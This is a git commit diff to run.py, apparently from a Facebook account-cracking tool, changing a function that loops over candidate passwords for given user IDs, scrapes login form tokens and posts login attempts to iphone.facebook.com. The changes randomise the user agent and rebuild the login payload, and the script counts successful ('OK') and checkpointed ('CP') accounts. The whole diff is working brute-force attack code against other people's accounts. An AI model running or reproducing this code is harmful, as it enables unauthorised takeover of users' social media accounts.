33c1ac30ec903dc0a8dcf3effc3811e3c32676c2
Rudal-XD <106883384+Rudal-XD@users.noreply.github.com>
2023-10-24 12:05:18 +0700

    Update run.py

--- run.py
+++ run.py
@@ -999,11 +999,13 @@ def methodnew(idf,pwv):
 	r=requests.Session()
 	prog.update(des,description=f'\r[bold white]new [bold green][{idf}] [bold white]{(loop)}/{len(id)}[/] [green]OK:[green]{ok}[/] [yellow]CP:[yellow]{cp}')
 	prog.advance(des)
+	ua = random.choice(free)
 	hst= 'iphone.facebook.com'
-	ua='Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36'
+	ua2='Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36'
 	for pw in pwv:
 		pw = pw.lower()
 		try:
+			hst= 'iphone.facebook.com'
 			url= 'https://{hst}/login.php?skip_api_login=1&api_key=322935469656730&kid_directed_site=0&app_id=322935469656730&signed_next=1&next=https%3A%2F%2F{hst}%2Fdialog%2Foauth%3Fclient_id%3D322935469656730%26redirect_uri%3Dhttps%253A%252F%252Fauth.meta.com%252Flogin%252Ffacebook%252Fresponse%252F%253Fstate%253DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26response_type%3Dcode%26scope%3Dpublic_profile%252Cemail%252Cuser_birthday%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dab649465-fbff-4ead-bd68-1de3ab7f9dcf%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fauth.meta.com%2Flogin%2Ffacebook%2Fresponse%2F%3Fstate%3DATCMVytVxs3h0vcwtuRnTboIZVGU1p8q4UHbGllNo8vq2pe5IPqyOfpkf_q1Uq5svpIjq5puNbPyQcIX1pOgaSIl0LKIhrb-8_hFoA-XEpAgEcaXRa5z5eTcn1p1ULhZ-wod-ybV_dypdtHDfRCGTF8nYtaiR6nU9hPmSVLIrxOiYwMHe_VE8ndo8keeolKKGR6i6iBvgiqIbTJogKobqz1fZIR1kagelBP5hTy4VySjsUJQazmiYjrzfH47-dXsHtrcmCjQfIFymBXUSR6XGKU4VQrGJcaN0l6Sgx--dJ965eNC0FSEQR5ohLW7NFzD0nq2QFGVYKUrnNw8Vxfah19oh6pcQDK0gVLEfGr812qeT7ZdV-Ef84p9WYRw9KhS9T6t-Pn0Pk3EQUiQerafL6kzHpe3VoopCDasoXA5H9N_HH-g3KU8LOU4CrvMftgT0cPDszrVUMvI7m0isu5Uz0ipWyZIsHS7jRRNbGVim1agC4WQYwwY_fuMsr8U9SCf-pcRARh7h7785H9dyB5RW7XTnNwHlcPHi2DF7zXWxaHh-Pggjgwr0EqXvrrbT9r2t32iqGYMtPdgV9-st5WZws77tPJF97-WDyLmDg-kduQWUIO8FBstxOBvyvuNJfkXayu_TCLxCmtDlFT_9Rihxv5IY3dmcUg_xYccs0Haq-hCdJu_vx367fg3CXZj5MH1bHbO9730ZvT10I6iK60%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr'
 			hdg = {
 				'Host': 'iphone.facebook.com',
@@ -1026,26 +1028,7 @@ def methodnew(idf,pwv):
 				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
 			}
 			req = bs(r.get(url,headers=hdg,allow_redirects=True).content,'html.parser'); raq = req.find('form',{'method':'post'})
-			data = {
-				lsd                : re.search('name="lsd" type="hidden" value="(.*?)"',str(requ)).group(1),
-				jazoest            : re.search('name="jazoest" type="hidden" value="(.*?)"',str(requ)).group(1),
-				m_ts               : re.search('name="m_ts" type="hidden" value="(.*?)"',str(requ)).group(1),
-				li                 : re.search('name="li" type="hidden" value="(.*?)"',str(requ)).group(1),
-				try_number         : re.search('name="try_number" type="hidden" value="(.*?)"',str(requ)).group(1),
-				unrecognized_tries : re.search('name="unrecognized_tries" type="hidden" value="(.*?)"',str(requ)).group(1),
-				email              : idf,
-				pass               : pwv,
-				prefill_contact_point: '',
-				prefill_source     : '',
-				prefill_type       : '',
-				first_prefill_source: '',
-				first_prefill_type : '',
-				had_cp_prefilled   : re.search('name="had_cp_prefilled" type="hidden" value="(.*?)"',str(requ)).group(1),
-				had_password_prefilled: re.search('name="had_password_prefilled" type="hidden" value="(.*?)"',str(requ)).group(1),
-				is_smart_lock      : re.search('name="is_smart_lock" type="hidden" value="(.*?)"',str(requ)).group(1),
-				bi_xrwh            : re.search('name="bi_xrwh" type="hidden" value="(.*?)"',str(requ)).group(1),
-				_fb_noscript       : re.search('name="_fb_noscript" type="hidden" value="(.*?)"',str(requ)).group(1),
-			}
+			data ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://developers.facebook.com/tools/debug/accesstoken/","flow":"login_no_pin","pass":pw,}
 			cookie = requests.Session().cookies.get_dict()
 			next = 'https://iphone.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8'
 			post = requests.Session().post(next,headers=hdg,data=data,cookies=cookie)
